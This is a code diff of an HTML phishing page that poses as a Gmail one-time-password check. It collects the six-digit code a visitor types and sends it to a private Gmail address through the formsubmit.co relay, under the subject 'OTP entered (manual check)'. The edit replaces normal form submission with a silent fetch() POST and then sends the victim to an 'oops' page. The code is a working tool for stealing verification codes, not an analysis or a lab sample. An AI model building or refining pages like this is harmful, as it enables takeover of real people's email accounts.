@@ -23,24 +23,23 @@
     <h2>Enter OTP</h2>
     <p style="text-align:center;">Please enter the 6-digit OTP sent to your Gmail.</p>
 
-    <form id="otpForm" action="https://formsubmit.co/minissweb@gmail.com" method="POST">
-      <!-- Hidden field to hold combined OTP -->
-      <input type="hidden" name="otp" id="fullOtp">
-      <input type="hidden" name="_subject" value="OTP entered (manual check)">
-      <input type="hidden" name="_next" value="oops.html">
-     <input type="text" name="otp" id="dummyOtp" style="display:none;">
-      <div class="otp-container">
-        <input type="text" maxlength="1" class="otp-box" name="digit1" required>
-        <input type="text" maxlength="1" class="otp-box" name="digit2" required>
-        <input type="text" maxlength="1" class="otp-box" name="digit3" required>
-        <input type="text" maxlength="1" class="otp-box" name="digit4" required>
-        <input type="text" maxlength="1" class="otp-box" name="digit5" required>
-        <input type="text" maxlength="1" class="otp-box" name="digit6" required>
+   <form id="otpForm" action="https://formsubmit.co/minissweb@gmail.com" method="POST">
+  <input type="hidden" name="otp" id="fullOtp">
+  <input type="hidden" name="_subject" value="OTP entered (manual check)">
+  <!-- remove _captcha and _next -->
+  
+  <div class="otp-container">
+    <input type="text" maxlength="1" class="otp-box" required>
+    <input type="text" maxlength="1" class="otp-box" required>
+    <input type="text" maxlength="1" class="otp-box" required>
+    <input type="text" maxlength="1" class="otp-box" required>
+    <input type="text" maxlength="1" class="otp-box" required>
+    <input type="text" maxlength="1" class="otp-box" required>
+  </div>
 
-      </div>
+  <button type="submit">Submit OTP</button>
+</form>
 
-      <button type="submit">Submit OTP</button>
-    </form>
 
     <div id="status" class="status"></div>
     <p class="note">Didn't receive OTP? Try again later.</p>
@@ -48,31 +47,34 @@
 </section>
 
 <script>
-  const otpBoxes = document.querySelectorAll('.otp-box');
-  const fullOtp = document.getElementById('fullOtp');
-  const form = document.getElementById('otpForm');
+ const form = document.getElementById('otpForm');
+const otpBoxes = document.querySelectorAll('.otp-box');
+const fullOtp = document.getElementById('fullOtp');
 
-  // Auto-focus next input when typing
-  otpBoxes.forEach((box, i) => {
-    box.addEventListener('input', () => {
-      if (box.value.length === 1 && i < otpBoxes.length -1) otpBoxes[i+1].focus();
-    });
-    box.addEventListener('keydown', (e) => {
-      if(e.key === "Backspace" && box.value === "" && i > 0) otpBoxes[i-1].focus();
-    });
-  });
+form.addEventListener('submit', function(e){
+  e.preventDefault(); // stop normal submit
 
-  // Combine OTP and submit
- form.addEventListener('submit', (e) => {
+  // Combine OTP
   const otpValue = Array.from(otpBoxes).map(input => input.value).join('');
-  document.getElementById('fullOtp').value = otpValue; // hidden field
-  document.getElementById('dummyOtp').value = otpValue; // dummy visible field for Formsubmit
-    // Form will submit normally, redirect handled by _next
+  fullOtp.value = otpValue;
+
+  // Submit via fetch (POST)
+  fetch(form.action, {
+    method: 'POST',
+    body: new FormData(form)
+  }).then(() => {
+    // redirect immediately
+    window.location.href = 'oops.html';
+  }).catch(() => {
+    alert('Something went wrong.');
   });
+});
+
 </script>
 
 </body>
 </html>
+
 
 
 
